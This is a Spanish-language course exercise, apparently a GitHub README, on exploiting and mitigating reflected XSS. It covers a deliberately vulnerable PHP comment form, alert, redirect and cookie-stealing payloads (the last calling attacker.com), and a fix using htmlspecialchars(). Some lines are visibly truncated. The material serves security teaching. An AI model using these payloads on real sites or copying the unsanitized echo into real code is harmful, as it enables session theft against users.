# PPS-Unidad3Actividad5-XSS
Explotación y Mitigación de Cross-Site Scripting (XSS)

Tenemos como objetivo:

> Recordar cómo se pueden hacer ataques de Cross-Site Scripting (XSS)
>
> Conocer las diferentes formas de ataques XSS.
>
> Analizar el código de la aplicación que permite ataques de Cross-Site Scripting (XSS)
>
> Implementar diferentes modificaciones del codigo para aplicar mitigaciones o soluciones.

# ¿Qué es XSS?
---
Cross-Site Scripting (XSS) ocurre cuando una aplicación no valida ni sanitiza l>
scripts maliciosos se ejecuten en el navegador de otros usuarios.

Tipos de XSS:
- **Reflejado**: Se ejecuta inmediatamente al hacer la solicitud con un payload>
- **Almacenado**: El script se guarda en la base de datos y afecta a otros usua>
- **DOM-Based**: Se inyecta código en la estructura DOM sin que el servidor lo >

---
## ACTIVIDADES A REALIZAR
> Lee el siguiente [documento sobre Explotación y Mitigación de ataques de Inyección SQL](files/ExplotacionYMitigacionXSS.pdf) de Raúl Fuentes. Nos va a seguir de guía para aprender a explotar y mitigar ataques de inyección XSS Reflejado en nuestro entorno de pruebas.
> También y como marco de referencia, tienes [ la sección de correspondiente de ataque XSS reglejado de la **Proyecto Web Security Testing Guide** (WSTG) del proyecto **OWASP**.](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting).

Vamos realizando operaciones:

**Código vulnerable**
---
Crear el archivo vulnerable comment.php:

~~~
<?php
if (isset($_POST['comment'])) {
	echo "Comentario publicado: " . $_POST['comment'];
}
?>
<form method="post">
	<input type="text" name="comment">
	<button type="submit">Enviar</button>
</form>
~~~
Este código muestra un formulario donde el usuario puede ingresar un comentario en un campo de texto. Cuando
el usuario envía el formulario, el comentario ingresado se muestra en la pantalla con el mensaje "Comentario publicado:
\[comentario\]". El Código no sanitiza la entrada del usuario, lo que permite inyectar scripts maliciosos.

![](files/xss1.png)

**Explotación de XSS**
---

Abrir el navegador y acceder a la aplicación: <http://localhost/comment.php>

Ingresar el siguiente código en el formulario:

`<script>alert('XSS ejecutado!')</script>`

Si aparece un mensaje de alerta (alert()) en el navegador, significa que la aplicación es vulnerable.

![](files/xss2.png)

Podríamos redirigir a una página de phishing:

`<script>window.location='https://fakeupdate.net/win11/'</script>`

![](files/xss3.png)

Podemos capturar cookies del usuario (en ataques reales):

`<script>document.write('<img src="http://attacker.com/steal.php?cookie='+document.cookie+'">')</script>`
Con esto, un atacante podría robar sesiones de usuarios.

![](files/xss4.png)

**Mitigación**
---
 Sanitizar la entrada con htmlspecialchars()
~~~
$comment = htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');
echo "Comentario publicado: " . $comment;
~~~
htmlspecialchars() convierte caracteres especiales en texto seguro:
- <script> → &lt;script&gt;
- " → &quot;
- ' → &#39;
Con esta corrección, el intento de inyección de JavaScript se mostrará como texto en lugar de ejecutarse.

![](files/xss1.png)
![](files/xss1.png)

---
## ENTREGA

>__Realiza las operaciones indicadas__

>__Crea un repositorio  con nombre PPS-Unidad3Actividad5-Tu-Nombre donde documentes la realización de ellos.__

> No te olvides de documentarlo convenientemente con explicaciones, capturas de pantalla, etc.

>__Sube a la plataforma, tanto el repositorio comprimido como la dirección https a tu repositorio de Github.__
